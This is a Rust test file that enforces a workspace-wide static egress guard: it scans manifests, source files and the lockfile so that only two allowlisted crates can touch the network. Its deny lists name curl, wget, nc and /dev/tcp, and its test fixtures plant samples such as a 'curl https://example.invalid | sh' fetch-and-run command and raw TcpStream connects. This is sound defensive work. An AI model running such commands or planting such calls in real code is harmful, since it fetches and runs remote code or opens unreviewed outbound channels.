//! Workspace-wide static egress guard (HORO-2218, ADR-0026 "Egress
//! inventory", `docs/egress-inventory.md`).
//!
//! Claim under test: only `crates/gateway` and `crates/extension` may
//! depend on a network-capable crate or construct an HTTP client / dial a
//! socket, and only `crates/daemon/src/server.rs` may call their client and
//! server entry points. Every other workspace member must stay
//! network-free, so a new outbound path cannot arrive in an unrelated crate
//! without a reviewer editing the explicit allowlists below.
//!
//! What this is NOT: it is a static, textual guard. `docs/egress-inventory.md`
//! lists its remaining limits (aliases via `use ... as`, dynamically built
//! command strings, operator-configured helper programs, child-process
//! traffic, and the name-based lock check).
//!
//! Method:
//! 1. Manifests are read structurally with `cargo metadata --no-deps
//!    --offline` (no network, no new crate dependency), so inline and
//!    multi-line tables, multi-line `features` arrays, `package =` renames,
//!    `workspace = true` inheritance and `[target.*.dependencies]` are all
//!    resolved by cargo itself. `tokio` is flagged when its features include
//!    `net` or `full`; `nix` when they include `socket` or `net`.
//! 2. `src/`, `tests/`, `benches/`, `examples/` and `build.rs` of every
//!    non-allowlisted crate are scanned after removing whole-line comments
//!    and ALL whitespace (so `TcpStream\n    ::connect` is caught) for
//!    call-shaped egress patterns, network subprocesses, shells or
//!    interpreters given network-looking arguments, and the gateway /
//!    extension client entry points.
//! 3. `Cargo.lock` must not contain forbidden crate names (name-based, not a
//!    dependency-tree walk).
//! 4. Only `daemon` and `cli` may depend on `gateway`/`extension`; they link
//!    them (so their binaries are network-capable transitively) but may not
//!    call the client/server entry points outside the allowlisted file.
//!
//! The scanner skips this file itself (its pattern literals would match);
//! that is the one deliberate blind spot.

use std::collections::BTreeSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

/// Crates whose presence in a dependency table means "can talk to a
/// network" (exact real package names, after any `package =` rename).
const NETWORK_CRATES: &[&str] = &[
    "reqwest",
    "hyper",
    "hyper-util",
    "hyper-rustls",
    "hyper-tls",
    "ureq",
    "curl",
    "curl-sys",
    "isahc",
    "surf",
    "attohttpc",
    "awc",
    "tungstenite",
    "tokio-tungstenite",
    "async-tungstenite",
    "rustls",
    "tokio-rustls",
    "native-tls",
    "tokio-native-tls",
    "openssl",
    "openssl-sys",
    "h2",
    "h3",
    "quinn",
    "socket2",
    "mio",
    "tonic",
    "git2",
    "ssh2",
    "lettre",
    "async-std",
    "smol",
    "hickory-resolver",
    "trust-dns-resolver",
];

/// Name prefixes treated the same way (telemetry/cloud SDK families).
const NETWORK_PREFIXES: &[&str] = &[
    "opentelemetry",
    "sentry",
    "aws-",
    "gix",
    "hickory-",
    "trust-dns-",
];

/// Crates that must not appear anywhere in `Cargo.lock`, not even
/// transitively. NAME-BASED: a renamed or vendored copy would not be seen.
/// `mio`, `socket2`, `h2`, `rustls` etc. are deliberately absent because the
/// gateway's reviewed hyper+rustls+tokio stack pulls them in.
const LOCK_FORBIDDEN: &[&str] = &[
    "reqwest",
    "ureq",
    "curl",
    "curl-sys",
    "isahc",
    "surf",
    "attohttpc",
    "awc",
    "tungstenite",
    "tokio-tungstenite",
    "async-tungstenite",
    "native-tls",
    "tokio-native-tls",
    "openssl",
    "openssl-sys",
    "hyper-tls",
    "quinn",
    "h3",
    "tonic",
    "git2",
    "ssh2",
    "lettre",
    "async-std",
    "smol",
    "hickory-resolver",
    "trust-dns-resolver",
];
const LOCK_FORBIDDEN_PREFIXES: &[&str] = &["opentelemetry", "sentry", "aws-", "gix"];

/// Call-shaped source patterns, matched against whitespace-free source.
const SOURCE_PATTERNS: &[&str] = &[
    "reqwest::",
    "ureq::",
    "curl::",
    "isahc::",
    "surf::",
    "attohttpc::",
    "tungstenite::",
    "native_tls::",
    "openssl::",
    "rustls::",
    "hyper_rustls::",
    "hyper_util::client",
    "hyper::client",
    "HttpConnector",
    "TcpStream::connect",
    "TcpStream::connect_timeout",
    "UdpSocket::bind",
    "UdpSocket::connect",
    "UdpSocket::send_to",
    ".to_socket_addrs(",
    "lookup_host(",
    "libc::connect",
    "libc::getaddrinfo",
    "libc::gethostbyname",
    "libc::socket(",
    "rustix::net",
    "nix::sys::socket",
];

/// Client/server entry points of the two audited crates. Outside those
/// crates they may be named only in the allowlisted `(file, entry)` pairs.
const ENTRY_POINTS: &[&str] = &[
    "ProviderClient",
    "post_signed",
    "libra_governor_extension::client",
    "libra_governor_gateway::server",
];
const ENTRY_POINT_ALLOWLIST: &[(&str, &str)] = &[
    // The daemon is the one host process that wires the opt-in extension
    // client and starts the opt-in gateway from validated config.
    ("crates/daemon/src/server.rs", "ProviderClient"),
    (
        "crates/daemon/src/server.rs",
        "libra_governor_gateway::server",
    ),
];

/// Programs whose `Command::new(<program>)` is network egress by purpose.
const EGRESS_PROGRAMS: &[&str] = &[
    "curl", "wget", "ssh", "scp", "sftp", "rsync", "nc", "ncat", "telnet", "ftp", "git", "gh",
    "pip", "pip3",
];
/// Shells and interpreters: flagged only when the following arguments look
/// like network use (they are otherwise ordinary local helpers).
const INTERPRETERS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "python", "python3", "perl", "ruby", "node", "cargo",
];
const NETWORK_ARG_TOKENS: &[&str] = &[
    "curl",
    "wget",
    "http://",
    "https://",
    "/dev/tcp",
    "ssh ",
    "scp ",
    "rsync",
    "ncat",
    " nc ",
    "git push",
    "git clone",
    "git fetch",
    "pip install",
    "cargo install",
    "cargo publish",
    "\"install\"",
    "\"publish\"",
    "\"fetch\"",
    "urllib",
    "socket.",
    "requests.",
];

/// `(crate directory, dependency, kind)`; `kind` is `normal`, `dev` or
/// `build`. `*` matches any dependency of that crate and kind.
type DepAllow = (&'static str, &'static str, &'static str);

/// Crates that legitimately hold network dependencies.
const DEP_ALLOWLIST: &[DepAllow] = &[
    // gateway: the opt-in LLM gateway. Its outbound client targets only the
    // validated, allowlisted upstream (default api.anthropic.com), pinned by
    // crates/gateway/tests/ssrf_and_config.rs. Reviewed rustls/hyper stack.
    ("gateway", "*", "normal"),
    ("gateway", "*", "dev"),
    // extension: webhook/provider client; loopback-literal destinations only
    // (crates/extension/src/config.rs validate_surface, unit-tested there).
    ("extension", "*", "normal"),
    ("extension", "*", "dev"),
    // daemon dev-dependencies only: tests/extension_integration.rs hosts a
    // loopback fake provider. Dev-dependencies are not linked into the
    // shipped binary.
    ("daemon", "hyper", "dev"),
    ("daemon", "hyper-util", "dev"),
    ("daemon", "tokio", "dev"),
];

/// `(file relative to workspace root, pattern)` pairs that are known false
/// positives: each file contains the pattern only inside a string literal
/// that plants a fake violation for its own scanner's negative-control test
/// (`scan("use reqwest::Client;...")`). Pinned per file and pattern;
/// `false_positive_exceptions_are_not_stale` fails if one stops matching.
const FALSE_POSITIVE_EXCEPTIONS: &[(&str, &str)] = &[
    ("crates/cli/src/dogfood_evidence_cmd.rs", "reqwest::"),
    (
        "crates/evidence-adapter/tests/no_network_symbols.rs",
        "reqwest::",
    ),
    (
        "crates/quota-source/tests/no_network_symbols.rs",
        "reqwest::",
    ),
];

/// Crates exempt from the *source* scan. Exactly the two audited egress
/// crates; nothing else (the daemon's tests are scanned too and are clean).
const SOURCE_ALLOWLIST: &[&str] = &["gateway", "extension"];

/// Workspace crates allowed to depend on gateway/extension (the host
/// process that wires them in, and its CLI front end).
const GATEWAY_EXTENSION_DEPENDENTS: &[&str] = &["daemon", "cli"];

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
enum Violation {
    Dependency {
        krate: String,
        dep: String,
        kind: String,
    },
    Source {
        file: String,
        pattern: String,
    },
    Subprocess {
        file: String,
        program: String,
    },
    EntryPoint {
        file: String,
        entry: String,
    },
    LockedCrate(String),
    UnexpectedDependent {
        krate: String,
        on: String,
    },
    UnlistedMember(String),
}

#[derive(Debug)]
struct DepEntry {
    name: String,
    kind: &'static str,
    features: Vec<String>,
}

#[derive(Debug)]
struct Member {
    /// Directory name, e.g. `gateway`.
    krate: String,
    /// Path relative to the workspace root, e.g. `crates/gateway`.
    rel: String,
    dir: PathBuf,
    deps: Vec<DepEntry>,
}

fn workspace_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
        .canonicalize()
        .expect("workspace root resolves from crates/cli")
}

/// Structural manifest read via cargo itself. `--no-deps --offline` never
/// touches the network or the registry index.
fn load_members(root: &Path) -> Vec<Member> {
    let cargo = std::env::var("CARGO").unwrap_or_else(|_| "cargo".to_string());
    let output = Command::new(cargo)
        .args([
            "metadata",
            "--format-version",
            "1",
            "--no-deps",
            "--offline",
        ])
        .arg("--manifest-path")
        .arg(root.join("Cargo.toml"))
        .output()
        .expect("cargo metadata runs");
    assert!(
        output.status.success(),
        "cargo metadata failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let meta: serde_json::Value = serde_json::from_slice(&output.stdout).expect("metadata json");
    let root = root.canonicalize().expect("root canonicalizes");
    let mut members = Vec::new();
    for pkg in meta["packages"].as_array().expect("packages") {
        let manifest = PathBuf::from(pkg["manifest_path"].as_str().expect("manifest_path"));
        let dir = manifest.parent().expect("manifest dir").to_path_buf();
        let dir = dir.canonicalize().unwrap_or(dir);
        let rel = dir
            .strip_prefix(&root)
            .unwrap_or(&dir)
            .to_string_lossy()
            .to_string();
        let krate = dir
            .file_name()
            .expect("dir name")
            .to_string_lossy()
            .to_string();
        let deps = pkg["dependencies"]
            .as_array()
            .expect("dependencies")
            .iter()
            .map(|d| DepEntry {
                name: d["name"].as_str().expect("dep name").to_string(),
                kind: match d["kind"].as_str() {
                    Some("dev") => "dev",
                    Some("build") => "build",
                    _ => "normal",
                },
                features: d["features"]
                    .as_array()
                    .map(|f| {
                        f.iter()
                            .filter_map(|x| x.as_str().map(String::from))
                            .collect()
                    })
                    .unwrap_or_default(),
            })
            .collect();
        members.push(Member {
            krate,
            rel,
            dir,
            deps,
        });
    }
    members.sort_by(|a, b| a.rel.cmp(&b.rel));
    members
}

fn is_network_dep(dep: &DepEntry) -> bool {
    let has = |f: &str| dep.features.iter().any(|x| x == f);
    NETWORK_CRATES.contains(&dep.name.as_str())
        || NETWORK_PREFIXES.iter().any(|p| dep.name.starts_with(p))
        || (dep.name == "tokio" && (has("net") || has("full")))
        || (dep.name == "nix" && (has("socket") || has("net")))
}

fn dep_allowed(krate: &str, dep: &str, kind: &str) -> bool {
    DEP_ALLOWLIST
        .iter()
        .any(|(c, d, k)| *c == krate && *k == kind && (*d == "*" || *d == dep))
}

fn collect_files(dir: &Path, ext: &str, out: &mut Vec<PathBuf>) {
    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };
    for entry in entries.filter_map(Result::ok) {
        let path = entry.path();
        // No directory is skipped by name: only the crate's top-level
        // `target/` is out of reach, because we start from `src`, `tests`,
        // `benches` and `examples`, so a `src/target/` module is scanned.
        if path.is_dir() {
            collect_files(&path, ext, out);
        } else if path.extension().is_some_and(|e| e == ext) {
            out.push(path);
        }
    }
}

/// Source with whole-line `//` comments (including `///`, `//!`) removed.
fn strip_line_comments(source: &str) -> String {
    source
        .lines()
        .filter(|l| !l.trim_start().starts_with("//"))
        .collect::<Vec<_>>()
        .join("\n")
}

fn quoted_strings(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut rest = text;
    while let Some(start) = rest.find('"') {
        let after = &rest[start + 1..];
        let Some(end) = after.find('"') else { break };
        out.push(after[..end].to_string());
        rest = &after[end + 1..];
    }
    out
}

fn subprocess_programs(code: &str) -> Vec<String> {
    let mut found = Vec::new();
    let mut rest = code;
    while let Some(pos) = rest.find("Command::new(") {
        let after = &rest[pos + "Command::new(".len()..];
        let head: String = after.chars().take(120).collect();
        if let Some(lit) = quoted_strings(&head).first() {
            let base = lit.rsplit('/').next().unwrap_or(lit);
            if EGRESS_PROGRAMS.contains(&base) {
                found.push(base.to_string());
            } else if INTERPRETERS.contains(&base) {
                let window: String = after.chars().take(400).collect::<String>().to_lowercase();
                if NETWORK_ARG_TOKENS.iter().any(|t| window.contains(t)) {
                    found.push(format!("{base} (network arguments)"));
                }
            }
        }
        rest = after;
    }
    found
}

fn scan_workspace(
    root: &Path,
    members: &[Member],
    self_file: Option<&Path>,
) -> BTreeSet<Violation> {
    scan_workspace_with(root, members, self_file, true)
}

fn scan_workspace_with(
    root: &Path,
    members: &[Member],
    self_file: Option<&Path>,
    honor_exceptions: bool,
) -> BTreeSet<Violation> {
    let mut violations = BTreeSet::new();
    let root = root.canonicalize().expect("root");

    for member in members {
        let krate = member.krate.as_str();
        for dep in &member.deps {
            if is_network_dep(dep) && !dep_allowed(krate, &dep.name, dep.kind) {
                violations.insert(Violation::Dependency {
                    krate: krate.to_string(),
                    dep: dep.name.clone(),
                    kind: dep.kind.to_string(),
                });
            }
            if (dep.name == "libra-governor-gateway" || dep.name == "libra-governor-extension")
                && !GATEWAY_EXTENSION_DEPENDENTS.contains(&krate)
                && !SOURCE_ALLOWLIST.contains(&krate)
            {
                violations.insert(Violation::UnexpectedDependent {
                    krate: krate.to_string(),
                    on: dep.name.clone(),
                });
            }
        }

        if SOURCE_ALLOWLIST.contains(&krate) {
            continue;
        }
        let mut files = Vec::new();
        for sub in ["src", "tests", "benches", "examples"] {
            collect_files(&member.dir.join(sub), "rs", &mut files);
        }
        let build_rs = member.dir.join("build.rs");
        if build_rs.is_file() {
            files.push(build_rs);
        }
        for file in files {
            if self_file.is_some_and(|me| me == file.as_path()) {
                continue;
            }
            let Ok(text) = fs::read_to_string(&file) else {
                continue;
            };
            let code = strip_line_comments(&text);
            // Whitespace-free copy defeats `TcpStream\n    ::connect`.
            let squeezed: String = code.chars().filter(|c| !c.is_whitespace()).collect();
            let rel = file
                .strip_prefix(&root)
                .unwrap_or(&file)
                .to_string_lossy()
                .to_string();
            for pattern in SOURCE_PATTERNS {
                if squeezed.contains(pattern)
                    && !(honor_exceptions
                        && FALSE_POSITIVE_EXCEPTIONS.contains(&(rel.as_str(), *pattern)))
                {
                    violations.insert(Violation::Source {
                        file: rel.clone(),
                        pattern: (*pattern).to_string(),
                    });
                }
            }
            for entry in ENTRY_POINTS {
                if squeezed.contains(entry)
                    && !ENTRY_POINT_ALLOWLIST.contains(&(rel.as_str(), *entry))
                {
                    violations.insert(Violation::EntryPoint {
                        file: rel.clone(),
                        entry: (*entry).to_string(),
                    });
                }
            }
            for program in subprocess_programs(&code) {
                violations.insert(Violation::Subprocess {
                    file: rel.clone(),
                    program,
                });
            }
        }
    }

    if let Ok(lock) = fs::read_to_string(root.join("Cargo.lock")) {
        for name in lock
            .lines()
            .filter_map(|l| l.strip_prefix("name = "))
            .flat_map(quoted_strings)
        {
            if LOCK_FORBIDDEN.contains(&name.as_str())
                || LOCK_FORBIDDEN_PREFIXES.iter().any(|p| name.starts_with(p))
            {
                violations.insert(Violation::LockedCrate(name));
            }
        }
    }
    violations
}

/// Every `crates/*/Cargo.toml` must be a workspace member, so a new crate
/// cannot sit outside the scan.
fn unlisted_members(root: &Path, members: &[Member]) -> BTreeSet<Violation> {
    let mut out = BTreeSet::new();
    if let Ok(entries) = fs::read_dir(root.join("crates")) {
        for entry in entries.filter_map(Result::ok) {
            if entry.path().join("Cargo.toml").is_file() {
                let rel = format!("crates/{}", entry.file_name().to_string_lossy());
                if !members.iter().any(|m| m.rel == rel) {
                    out.insert(Violation::UnlistedMember(rel));
                }
            }
        }
    }
    out
}

fn this_file() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests")
        .join("egress_static_guard.rs")
        .canonicalize()
        .expect("this file")
}

// ---------------------------------------------------------------------
// The real guard
// ---------------------------------------------------------------------

#[test]
fn only_gateway_and_extension_hold_network_capability() {
    let root = workspace_root();
    let members = load_members(&root);
    // Anti-vacuity: the walk must really see the workspace.
    assert!(members.len() >= 10, "found only {} members", members.len());
    for must in [
        "crates/gateway",
        "crates/extension",
        "crates/daemon",
        "crates/cli",
    ] {
        assert!(members.iter().any(|m| m.rel == must), "{must} missing");
    }

    let mut violations = scan_workspace(&root, &members, Some(&this_file()));
    violations.extend(unlisted_members(&root, &members));
    assert!(
        violations.is_empty(),
        "egress guard violations (see docs/egress-inventory.md before touching the \
         allowlists in crates/cli/tests/egress_static_guard.rs): {violations:#?}"
    );
}

#[test]
fn false_positive_exceptions_are_not_stale() {
    let root = workspace_root();
    let members = load_members(&root);
    let raw = scan_workspace_with(&root, &members, Some(&this_file()), false);
    for (file, pattern) in FALSE_POSITIVE_EXCEPTIONS {
        assert!(
            raw.contains(&Violation::Source {
                file: (*file).to_string(),
                pattern: (*pattern).to_string(),
            }),
            "exception ({file}, {pattern}) no longer matches anything; remove it"
        );
    }
}

#[test]
fn entry_point_allowlist_is_not_stale() {
    let root = workspace_root();
    for (file, entry) in ENTRY_POINT_ALLOWLIST {
        let text = fs::read_to_string(root.join(file)).expect("allowlisted file exists");
        let squeezed: String = strip_line_comments(&text)
            .chars()
            .filter(|c| !c.is_whitespace())
            .collect();
        assert!(squeezed.contains(entry), "({file}, {entry}) is stale");
    }
}

#[test]
fn the_real_scan_actually_reads_source_and_manifests() {
    // The audited crates must be recognised as network-capable (so the
    // allowlist is load-bearing, not dead).
    let members = load_members(&workspace_root());
    let find = |name: &str| members.iter().find(|m| m.krate == name).expect(name);
    assert!(find("gateway")
        .deps
        .iter()
        .any(|d| d.name == "hyper-rustls" && d.kind == "normal"));
    assert!(find("extension")
        .deps
        .iter()
        .any(|d| d.name == "hyper" && d.kind == "normal"));
    assert!(find("daemon")
        .deps
        .iter()
        .any(|d| d.name == "tokio" && d.kind == "dev" && is_network_dep(d)));
}

// ---------------------------------------------------------------------
// Negative controls: the scanner must detect injected violations.
// ---------------------------------------------------------------------

fn write(path: &Path, text: &str) {
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, text).unwrap();
}

/// A synthetic workspace. Each member is `(directory name, extra manifest
/// text appended after the package header, [(relative file, contents)])`.
type FixtureMember<'a> = (&'a str, &'a str, &'a [(&'a str, &'a str)]);

fn workspace(members: &[FixtureMember<'_>]) -> (tempfile::TempDir, Vec<Member>) {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();
    let list: Vec<String> = members
        .iter()
        .map(|(n, _, _)| format!("\"crates/{n}\""))
        .collect();
    write(
        &root.join("Cargo.toml"),
        &format!(
            "[workspace]\nresolver = \"2\"\nmembers = [{}]\n[workspace.dependencies]\nhyper = \"1\"\n",
            list.join(", ")
        ),
    );
    for (name, extra, files) in members {
        write(
            &root.join(format!("crates/{name}/Cargo.toml")),
            &format!(
                "[package]\nname = \"{name}\"\nversion = \"0.0.0\"\nedition = \"2021\"\n{extra}\n"
            ),
        );
        write(&root.join(format!("crates/{name}/src/lib.rs")), "");
        for (rel, text) in *files {
            write(&root.join(format!("crates/{name}/{rel}")), text);
        }
    }
    let loaded = load_members(root);
    (dir, loaded)
}

fn evil(manifest: &str, src: &str) -> (tempfile::TempDir, Vec<Member>) {
    workspace(&[("evil", manifest, &[("src/extra.rs", src)])])
}

fn deps_flagged(manifest: &str) -> BTreeSet<String> {
    let (dir, members) = evil(manifest, "");
    scan_workspace(dir.path(), &members, None)
        .into_iter()
        .filter_map(|v| match v {
            Violation::Dependency { dep, .. } => Some(dep),
            _ => None,
        })
        .collect()
}

#[test]
fn clean_fixture_has_no_violations() {
    let (dir, members) = workspace(&[
        (
            "evil",
            "[dependencies]\nserde = \"1\"\n",
            &[("src/extra.rs", "pub fn f() {}\n")],
        ),
        ("clean", "", &[]),
    ]);
    assert!(scan_workspace(dir.path(), &members, None).is_empty());
    assert_eq!(members.len(), 2);
}

#[test]
fn negative_control_flags_network_dependencies_in_every_manifest_spelling() {
    let cases: &[(&str, &str)] = &[
        // plain and inline
        ("[dependencies]\nreqwest = \"0.12\"\n", "reqwest"),
        ("[dev-dependencies]\nureq = { version = \"2\" }\n", "ureq"),
        ("[build-dependencies]\ncurl = \"0.4\"\n", "curl"),
        // sub-table
        ("[dependencies.hyper-util]\nversion = \"0.1\"\n", "hyper-util"),
        // multi-line inline table
        (
            "[dependencies]\nisahc = {\n    version = \"1\",\n    default-features = false,\n}\n",
            "isahc",
        ),
        // target-specific
        ("[target.'cfg(unix)'.dependencies]\nisahc = \"1\"\n", "isahc"),
        // plain rename
        ("[dependencies]\nsneaky = { version = \"1\", package = \"surf\" }\n", "surf"),
        // multi-line rename
        (
            "[dependencies]\nsneaky = {\n    version = \"1\",\n    package = \"reqwest\",\n}\n",
            "reqwest",
        ),
        // sub-table rename
        ("[dependencies.sneaky]\nversion = \"1\"\npackage = \"ureq\"\n", "ureq"),
        // tokio: net, full, multi-line array, sub-table, inheritance of net
        (
            "[dependencies]\ntokio = { version = \"1\", features = [\"rt\", \"net\"] }\n",
            "tokio",
        ),
        ("[dependencies]\ntokio = { version = \"1\", features = [\"full\"] }\n", "tokio"),
        (
            "[dependencies]\ntokio = { version = \"1\", features = [\n    \"rt\",\n    \"time\",\n    \"full\",\n] }\n",
            "tokio",
        ),
        ("[dependencies.tokio]\nversion = \"1\"\nfeatures = [\n  \"net\",\n]\n", "tokio"),
        // inheritance
        ("[dependencies]\nhyper = { workspace = true }\n", "hyper"),
        ("[dependencies]\nhyper.workspace = true\n", "hyper"),
        // broader families
        ("[dependencies]\ntonic = \"0.12\"\n", "tonic"),
        ("[dependencies]\nsentry = \"0.34\"\n", "sentry"),
        ("[dependencies]\nopentelemetry-otlp = \"0.26\"\n", "opentelemetry-otlp"),
        ("[dependencies]\naws-sdk-s3 = \"1\"\n", "aws-sdk-s3"),
        ("[dependencies]\ngit2 = \"0.19\"\n", "git2"),
        ("[dependencies]\nssh2 = \"0.9\"\n", "ssh2"),
        ("[dependencies]\nmio = \"1\"\n", "mio"),
        ("[dependencies]\nnix = { version = \"0.29\", features = [\"socket\"] }\n", "nix"),
    ];
    for (manifest, expected) in cases {
        let flagged = deps_flagged(manifest);
        assert!(flagged.contains(*expected), "{manifest:?} -> {flagged:?}");
    }
}

#[test]
fn negative_control_does_not_flag_tokio_without_net_or_ordinary_crates() {
    let flagged = deps_flagged(
        "[dependencies]\ntokio = { version = \"1\", features = [\"rt\", \"time\"] }\nserde = \"1\"\nnix = { version = \"0.29\", features = [\"fs\"] }\n",
    );
    assert!(flagged.is_empty(), "{flagged:?}");
}

#[test]
fn negative_control_flags_injected_source_and_subprocess_egress() {
    let src = r#"
use std::net::TcpStream;
pub fn leak() {
    let _ = TcpStream::connect("203.0.113.9:443");
    let _ = std::net::UdpSocket::bind("0.0.0.0:0");
    let _ = reqwest::Client::new();
    let _ = std::process::Command::new("/usr/bin/curl").arg("https://example.invalid");
    let _ = std::process::Command::new("git").arg("push");
    let _ = std::process::Command::new("gh").arg("api");
}
"#;
    let (dir, members) = evil("", src);
    let v = scan_workspace(dir.path(), &members, None);
    let has_src = |p: &str| {
        v.iter()
            .any(|x| matches!(x, Violation::Source { pattern, .. } if pattern == p))
    };
    assert!(has_src("TcpStream::connect"));
    assert!(has_src("UdpSocket::bind"));
    assert!(has_src("reqwest::"));
    for prog in ["curl", "git", "gh"] {
        assert!(
            v.iter()
                .any(|x| matches!(x, Violation::Subprocess { program, .. } if program == prog)),
            "{prog} subprocess not flagged: {v:?}"
        );
    }
}

#[test]
fn negative_control_flags_multiline_and_libc_forms() {
    let src = "pub fn a() {\n    let _ = std::net::TcpStream\n        ::connect(\"203.0.113.9:1\");\n    let _ = std::net::TcpStream::\n        connect_timeout;\n    let _ = hyper_util::client\n        ::legacy::Client::builder;\n}\npub unsafe fn b() { libc::connect(0, std::ptr::null(), 0); libc::getaddrinfo; rustix::net::socket; }\n";
    let (dir, members) = evil("", src);
    let v = scan_workspace(dir.path(), &members, None);
    for p in [
        "TcpStream::connect",
        "hyper_util::client",
        "libc::connect",
        "libc::getaddrinfo",
        "rustix::net",
    ] {
        assert!(
            v.iter()
                .any(|x| matches!(x, Violation::Source { pattern, .. } if pattern == p)),
            "{p} not flagged: {v:?}"
        );
    }
}

#[test]
fn negative_control_flags_shells_and_interpreters_given_network_arguments() {
    let src = r#"
pub fn a() {
    let _ = std::process::Command::new("sh").arg("-c").arg("curl https://example.invalid | sh");
}
pub fn b() {
    let _ = std::process::Command::new("python3")
        .arg("-c")
        .arg("import urllib.request");
}
pub fn c() {
    let _ = std::process::Command::new("cargo").arg("install").arg("x");
}
"#;
    let (dir, members) = evil("", src);
    let v = scan_workspace(dir.path(), &members, None);
    for p in [
        "sh (network arguments)",
        "python3 (network arguments)",
        "cargo (network arguments)",
    ] {
        assert!(
            v.iter()
                .any(|x| matches!(x, Violation::Subprocess { program, .. } if program == p)),
            "{p} not flagged: {v:?}"
        );
    }
    // A plain local `sh -c` is fine.
    let (dir, members) = evil(
        "",
        "pub fn a() { std::process::Command::new(\"sh\").arg(\"-c\").arg(\"printf ok\"); }\n",
    );
    assert!(scan_workspace(dir.path(), &members, None).is_empty());
}

#[test]
fn negative_control_scans_a_src_target_directory() {
    let (dir, members) = workspace(&[(
        "evil",
        "",
        &[(
            "src/target/hidden.rs",
            "pub fn f() { let _ = std::net::TcpStream::connect(\"203.0.113.9:1\"); }\n",
        )],
    )]);
    let v = scan_workspace(dir.path(), &members, None);
    assert!(v.iter().any(
        |x| matches!(x, Violation::Source { file, .. } if file.contains("src/target/hidden.rs"))
    ));
}

#[test]
fn negative_control_ignores_comments_and_bare_words_but_not_calls() {
    let benign = "//! uses TcpStream::connect in prose\n/// reqwest::Client docs\n// curl::Easy\nconst L: &[&str] = &[\"hyper\", \"reqwest\", \"TcpStream\"];\npub fn ok() { std::process::Command::new(\"sh\"); }\n";
    let (dir, members) = evil("", benign);
    assert!(scan_workspace(dir.path(), &members, None).is_empty());
}

#[test]
fn negative_control_restricts_gateway_and_extension_entry_points() {
    let uses = "use libra_governor_extension::ProviderClient;\npub fn f() { let _ = ProviderClient::new(); libra_governor_gateway::server::run_gateway; post_signed; }\n";
    // Anywhere outside the allowlist: flagged.
    let (dir, members) = evil("", uses);
    let v = scan_workspace(dir.path(), &members, None);
    for e in [
        "ProviderClient",
        "post_signed",
        "libra_governor_gateway::server",
    ] {
        assert!(
            v.iter()
                .any(|x| matches!(x, Violation::EntryPoint { entry, .. } if entry == e)),
            "{e} not flagged: {v:?}"
        );
    }
    // The one allowlisted daemon file may name ProviderClient/gateway server,
    // but another daemon file or `post_signed` may not.
    let (dir, members) = workspace(&[(
        "daemon",
        "",
        &[
            ("src/server.rs", "pub fn f() { let _ = ProviderClient::new(); libra_governor_gateway::server::run_gateway; }\n"),
            ("src/other.rs", "pub fn g() { let _ = ProviderClient::new(); }\n"),
        ],
    )]);
    let v = scan_workspace(dir.path(), &members, None);
    assert!(!v.iter().any(
        |x| matches!(x, Violation::EntryPoint { file, .. } if file.ends_with("src/server.rs"))
    ));
    assert!(v.iter().any(
        |x| matches!(x, Violation::EntryPoint { file, .. } if file.ends_with("src/other.rs"))
    ));
}

#[test]
fn negative_control_flags_a_lockfile_with_a_forbidden_client_crate() {
    let (dir, members) = evil("", "");
    write(
        &dir.path().join("Cargo.lock"),
        "[[package]]\nname = \"reqwest\"\n[[package]]\nname = \"sentry-core\"\n[[package]]\nname = \"aws-config\"\n[[package]]\nname = \"serde\"\n[[package]]\nname = \"mio\"\n",
    );
    let v = scan_workspace(dir.path(), &members, None);
    for n in ["reqwest", "sentry-core", "aws-config"] {
        assert!(v.contains(&Violation::LockedCrate(n.to_string())), "{n}");
    }
    // The reviewed stack's transitive crates are not flagged.
    assert!(!v.contains(&Violation::LockedCrate("serde".to_string())));
    assert!(!v.contains(&Violation::LockedCrate("mio".to_string())));
}

#[test]
fn negative_control_flags_laundering_through_gateway_or_extension() {
    let (dir, members) = workspace(&[
        ("gateway", "", &[]),
        (
            "evil",
            "[dependencies]\nlibra-governor-gateway = { path = \"../gateway\" }\n",
            &[],
        ),
    ]);
    let v = scan_workspace(dir.path(), &members, None);
    assert!(v
        .iter()
        .any(|x| matches!(x, Violation::UnexpectedDependent { krate, .. } if krate == "evil")));
}

#[test]
fn negative_control_flags_a_crate_missing_from_workspace_members() {
    let (dir, members) = evil("", "");
    write(
        &dir.path().join("crates/stowaway/Cargo.toml"),
        "[package]\nname = \"stowaway\"\n",
    );
    let v = unlisted_members(dir.path(), &members);
    assert!(v.contains(&Violation::UnlistedMember("crates/stowaway".to_string())));
}

#[test]
fn allowlisted_crates_are_exempt_only_for_their_listed_dependencies() {
    assert!(dep_allowed("gateway", "hyper-rustls", "normal"));
    assert!(dep_allowed("extension", "hyper", "dev"));
    assert!(dep_allowed("daemon", "hyper", "dev"));
    // The daemon's *normal* dependencies stay network-free.
    assert!(!dep_allowed("daemon", "hyper", "normal"));
    assert!(!dep_allowed("daemon", "reqwest", "dev"));
    assert!(!dep_allowed("cli", "hyper", "dev"));
    assert!(!dep_allowed("evidence-adapter", "tokio", "normal"));
}
